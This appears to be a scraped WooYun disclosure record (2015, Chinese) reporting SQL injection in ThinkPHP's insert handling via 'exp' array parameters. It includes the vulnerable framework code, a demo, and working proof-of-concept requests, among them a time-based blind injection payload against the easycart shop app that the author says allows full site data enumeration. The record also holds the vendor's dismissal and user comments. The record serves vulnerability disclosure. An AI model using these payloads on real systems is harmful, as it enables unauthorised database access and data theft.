{"id": 1436, "wybug_id": "wooyun-2015-0115580", "wybug_title": "thinkphp 某处缺陷可造成sql注射", "wybug_corp": "ThinkPHP", "wybug_author": "魔鬼的步伐", "wybug_date": "2015-05-27 17:02", "wybug_open_date": "2015-08-25 17:29", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-27：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-25：\t细节向公众公开  简要描述： thinkphp 某处缺陷可造成sql注射 详细说明：  下载最新的版本:强调一下和ph大神的漏洞 信息不一样  地方和函数都不一样 他那个已经被修复了写一个demo:\npublic function test(){                                $data = $_GET['data'];        $u = M('Data')->data(array(                                        'data' => $data        ))->add();        dump($u);    }\n问题出在哪里：先看看data函数:\npublic function data($data=''){        if('' === $data && !empty($this->data)) {            return $this->data;        }        if(is_object($data)){            $data   =   get_object_vars($data);        }elseif(is_string($data)){            parse_str($data,$data);        }elseif(!is_array($data)){            E(L('_DATA_TYPE_INVALID_'));        }        $this->data = $data;        return $this;    }\n没有做任何处理然后数据流入到了add函数里面：\npublic function add($data='',$options=array(),$replace=false) {        if(empty($data)) {            // 没有传递数据，获取当前数据对象的值            if(!empty($this->data)) {                $data           =   $this->data;                // 重置数据                $this->data     = array();            }else{                $this->error    = L('_DATA_TYPE_INVALID_');                return false;            }        }        // 数据处理        $data       =   $this->_facade($data);        // 分析表达式        $options    =   $this->_parseOptions($options);                        if(false === $this->_before_insert($data,$options)) {            return false;        }                        // 写入数据到数据库        $result = $this->db->insert($data,$options,$replace);\n其他的都不用看 主要看insert函数:\npublic function insert($data,$options=array(),$replace=false) {        $values  =  $fields    = array();        $this->model  =   $options['model'];        $this->parseBind(!empty($options['bind'])?$options['bind']:array());                foreach ($data as $key=>$val){                                    if(is_array($val) && 'exp' == $val[0]){                                                $fields[]   =  $this->parseKey($key);                $values[]   =  $val[1];            }elseif(is_scalar($val)) { // 过滤非标量数据                $fields[]   =   $this->parseKey($key);                if(0===strpos($val,':') && in_array($val,array_keys($this->bind))){                    $values[]   =   $this->parseValue($val);                }else{                    $name       =   count($this->bind);                    $values[]   =   ':'.$name;                    $this->bindParam($name,$val);                }            }        }        // 兼容数字传入方式        $replace= (is_numeric($replace) && $replace>0)?true:$replace;        $sql    = (true===$replace?'REPLACE':'INSERT').' INTO '.$this->parseTable($options['table']).' ('.implode(',', $fields).') VALUES ('.implode(',', $values).')'.$this->parseDuplicate($replace);        $sql    .= $this->parseComment(!empty($options['comment'])?$options['comment']:'');        return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);\n最终VALUES ('.implode(',', $values).') 这样一来我们就可以无视gpc函数进行注入了if(is_array($val) && 'exp' == $val[0]){                 $fields[]   =  $this->parseKey($key);                $values[]   =  $val[1];http://localhost:8081/phpthink/index.php?a=test&data[0]=exp&data[1]=1,2,3,4,5&data[2]=2后台抓取sql语句为:2015/1/29 12:56 INSERT INTO `think_data` (`data`) VALUES (1,2,3,4,5)\n\n然后 我们在看一下 现实中的例子我们那原创中国easycartMemberIndex.class.php:\npublic function doShippingAddress(){\t\tself::$Model=D(\"Shippingaddress\");\t\t$list=self::$Model->where(\"id=\".$this->memberID)->find();\t\tif (self::$Model->create()){\t\t\t//邮件订阅\t\t\t$model=D('Newsletter');\t\t\tif(isset($_POST['isNewsletter']) && $_POST['isNewsletter']==1){\t\t\t\t$data['email']=$_POST['email'];\t\t\t\t$data['addtime']=time();\t\t\t\tif(isset($_POST['id']) && $_POST['id']>0){\t\t\t\t\t$map['memberid']=$data['memberid']=$_POST['id'];\t\t\t\t\tif($_POST['Newsletter_id']){\t\t\t\t\t\t$map['id']=$_POST['Newsletter_id'];\t\t\t\t\t}\t\t\t\t\t$map['_logic']='or';\t\t\t\t\tif(false == $model->where($map)->save($data)){\t\t\t\t\t\t$model->add($data);\t\t\t\t\t}\t\t\t\t}\n这里面的id正好符合要求:url：http://localhost/easycart/index.php/MemberIndex-doShippingAddress.htmlpostdata:id[0]=exp&id[1]=if(ascii((substr((select user()),1,1)))=114,sleep(5),1)&Newsletter_id=1抓取sql语句为:INSERT INTO `ec_shippingaddress` (`id`) VALUES (if(ascii((substr((select user()),1,1)))=114,sleep(5),1))这样一来就可以进行全站信息枚举   漏洞证明：     修复方案：     版权声明：转载请注明来源 魔鬼的步伐@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-08-25 17:29 厂商回复： 如果采用官方提供的I函数获取用户输入的参数的话 这个问题是不存在的 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-27 17:10 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  摩擦摩擦    \n     2015-05-27 17:24 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  关注    \n     2015-05-27 17:24 |    \t\tThinkPHP(乌云厂商)\t\t \n  为啥不使用I函数安全获取参数呢？    \n     2015-05-29 10:42 |    \t\t胡萝卜君 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 乌云的天空)\t\t \n  平时都用的I    \n     2015-08-25 20:45 |    \t\t风吹蛋蛋凉 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | “北风吹，秋风凉，谁家娇妻守空房？有困难...)\t\t \n  马克。    \n     2015-08-26 17:48 |    \t\tpyphrb \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:6        | ...........................................)\t\t \n  @ThinkPHP 为什么要用，php本来就是一门松散的语言，你设计的时候全局作hook吧    \n     2015-08-28 10:42 |    \t\t大大怪 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | PHP 爱好者)\t\t \n  @ThinkPHP 这种厂商，我也是服了。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}